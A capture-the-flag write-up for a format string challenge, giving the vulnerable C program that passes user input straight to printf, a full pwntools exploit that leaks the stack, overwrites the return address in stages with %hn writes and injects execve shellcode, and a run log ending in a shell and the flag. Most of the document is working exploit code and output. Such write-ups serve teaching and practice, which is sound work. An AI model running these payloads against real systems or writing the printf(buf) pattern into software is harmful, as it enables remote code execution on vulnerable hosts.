# nothing to say

The following code is vulnerable to a format string exploit:

```C
// gcc -fno-stack-protector -no-pie -z execstack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_proc() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void read_string(char* buf, size_t length) {
    ssize_t n;
    n = read(STDIN_FILENO, buf, length);
    if (n == -1)
        exit(1);
    buf[n] = '\0';
}

int main(void) {
    char buf[0x100];
    init_proc();
    printf("Hello CTF Players!\nThis is a warmup challenge for pwnable.\nDo you know about Format String Attack(FSA) and write the exploit code?\nPlease pwn me!\n");
    while (1) {
        printf("> ");
        read_string(buf, 0x100);
        if (buf[0] == 'q')
            break;
        printf(buf);
    }
    return 0;
}
```

In our case, we opt for overwriting main()'s return value to point to our shellcode buffer.  We do this in two stages..

After that, we upload the final stage shellcode and quit the program to obtain execution..


Our final exploit looks like this:

```python
#!/usr/bin/python3
from pwn import *

def exploit():
	OFFSET = 264

	# execve('/bin//sh', NULL, NULL) Shellcode
	SHELLCODE  = b"\x90"
	SHELLCODE += b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x50\x88\x44"
	SHELLCODE += b"\x24\x08\xc7\x44\x24\x04\x2f\x2f\x73\x68\xc7\x04\x24\x2f\x62"
	SHELLCODE += b"\x69\x6e\x48\x89\xe7\xb0\x3b\x0f\x05"

	# Leak the stack
	p = remote('pwn02.chal.ctf.westerns.tokyo', 18247)
	p.recvuntil('> ')
	p.sendline("%llx")
	data = p.recv(12).decode('ascii').rstrip()
	stack_leak = int(data, 16)
	ret_val = stack_leak + OFFSET
	buf_leak = stack_leak + 8
	print("RET LEAK @ 0x{:x}".format(ret_val))

	a = int(data[:4], 16)
	b = int('0x'+data[4:6], 16)
	c = int('0x'+data[6:8], 16)
	d = int('0x'+data[8:10], 16)
	e = int('0x'+data[10:12], 16)
	e += 8

	print("BUF_SPLIT")
	print("0x{:x}".format(buf_leak))
	print("a:{:x} b:{:x} c:{:x} d:{:x} e:{:x}".format(a, b, c, d, e))

	while e>d:
		d += 0x100
	while d>c:
		c += 0x100
	while c>b:
		b += 0x100

	# Overwrite RET
	log.info("Sending second stage")
	payload  = b""
	payload += "%{0}u%13$hn%{1}u%14$hn%{2}u%15$hn%{3}u%16$hn".format(e,d-e, c-d, b-c, a-b).ljust(56).encode('utf-8')
	payload += p64(ret_val)
	payload += p64(ret_val+1)
	payload += p64(ret_val+2)
	payload += p64(ret_val+3)
	payload += p64(ret_val+4)
	payload += p64(0x00) * 2

	# Send second stage
	p.recvuntil('> ')
	p.sendline(payload)

	# Overwrite RET pt2 (third stage)
	log.info("Sending third stage")
	payload  = b""
	payload += "%{0}u%13$hn%{1}u%14$hn".format(b,a-b).ljust(56).encode('utf-8')
	payload += p64(ret_val+3)
	payload += p64(ret_val+4)
	payload += p64(0x00) * 3

	# Send third stage
	p.recvuntil('> ')
	p.sendline(payload)

	# Send shellcode
	plen = len(payload)
	payload  = b""
	payload += b"\x90" * (plen - len(SHELLCODE))
	payload += SHELLCODE
	p.recvuntil('> ')
	p.sendline(payload)
	p.sendline('q')

	# Check if shell if not rerun exploit
	p.recvuntil('>')
	p.sendline('whoami')
	data = p.clean()
	data = data.decode('ascii').rstrip()
	print("[GOT DATA] {}".format(data))
	if data != 'whoami':
		p.interactive()
	else:
		print("RERUN EXPLOIT...")

if __name__ == "__main__":
	exploit()
```


```
$ python3 ./exploit.py
[+] Opening connection to pwn02.chal.ctf.westerns.tokyo on port 18247: Done
RET LEAK @ 0x7ffc99757fc8
BUF_SPLIT
0x7ffc99757ec8
a:7ffc b:99 c:75 d:7e e:c8
[*] Sending second stage
[*] Sending third stage
[GOT DATA]
[*] Switching to interactive mode
$ ls
flag.txt
nothing
$ cat ./flag.txt
TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}
```
